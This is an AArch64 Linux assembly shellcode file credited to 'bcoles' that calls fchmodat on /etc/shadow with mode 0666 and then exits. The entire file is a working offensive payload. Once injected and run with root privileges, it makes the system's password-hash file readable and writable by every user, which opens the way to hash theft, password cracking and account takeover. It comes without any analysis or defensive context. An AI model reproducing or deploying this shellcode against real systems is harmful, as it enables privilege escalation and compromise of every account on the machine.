# AArch64 64-bit chmod(/etc/shadow, 0666) shellcode
# ---
# bcoles

.global _start
.section .text

_start:
    # sys_fchmodat(int dfd, const char *filename, umode_t mode, int flags)
    # fchmodat(AT_FDCWD, "/etc/shadow", 0666, 0)

    mov     x0, -100   // AT_FDCWD
    adr     x1, path   // pointer to path
    mov     x2, #0666  // mode
    mov     x3, #0     // flags
    mov     x8, #53    // __NR_fchmodat
    svc     #0

    mov     x0, #0
    mov     x8, #93    // __NR_exit
    svc     #0

path:
    .asciz "/etc/shadow"
